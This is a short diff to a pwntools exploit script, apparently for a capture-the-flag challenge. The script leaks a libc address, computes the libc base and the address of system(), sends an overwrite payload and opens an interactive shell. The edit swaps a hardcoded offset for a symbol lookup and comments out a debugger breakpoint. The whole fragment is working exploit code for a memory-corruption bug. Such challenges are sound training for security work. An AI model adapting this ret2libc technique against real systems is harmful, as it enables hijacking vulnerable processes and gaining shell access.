@@ -21,7 +21,7 @@ def exploit():
     p.recvuntil("Thanks! we will proceed your request :)\n")
     libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
     log.info("Libc leak: {}".format(hex(libc_leak)))
-    libc_base = libc_leak - 0x0809c0
+    libc_base = libc_leak - libc.symbols["puts"]
     log.info("Libc base: {}".format(hex(libc_base)))
     system_libc = libc_base + libc.symbols["system"]
     log.info("System Libc leak: {}".format(hex(system_libc)))
@@ -37,10 +37,10 @@ def exploit():
     payload += p64(0)*2
     payload += p64(system_libc)
 
-    gdb.attach(p, '''
-                b *main+1280
-                c
-                ''')
+    #gdb.attach(p, '''
+    #            b *main+1280
+    #            c
+    #            ''')
 
     p.sendline(payload)
     p.interactive()
